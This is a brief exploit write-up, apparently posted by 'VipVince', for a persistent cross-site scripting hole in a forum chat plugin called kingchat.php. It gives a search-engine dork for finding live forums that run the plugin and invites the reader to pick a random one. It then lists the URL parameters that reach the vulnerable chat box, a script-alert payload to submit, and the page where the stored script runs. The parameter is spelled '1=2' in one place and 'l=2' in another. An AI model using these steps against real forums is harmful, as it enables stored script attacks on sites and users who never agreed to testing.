Tested on: Windows

Using the dork  inurl:/kingchat.php? you will see multiple forums running this chat plugin.

Note *Registration on the forums is required* for persistent XSS to work.

Now click a random forum with this plugin installed and you will see this:

http://vulnforum.com/kingchat.php?notic

Remove 'notic' at the end of the URL and add "chat=2&1=2" to our query so it becomes:

http://server/kingchat.php?chat=2&l=2

You will see the vulnerable chat box :). Submit your XSS for instance <script>alert("vipvince")</script>

Now to see our saved JavaScript alert go to:

http://server/kingchat.php?chat=2&l=2&message=

Your persistant XSS will be stored here.

Enjoy ;). VipVince.
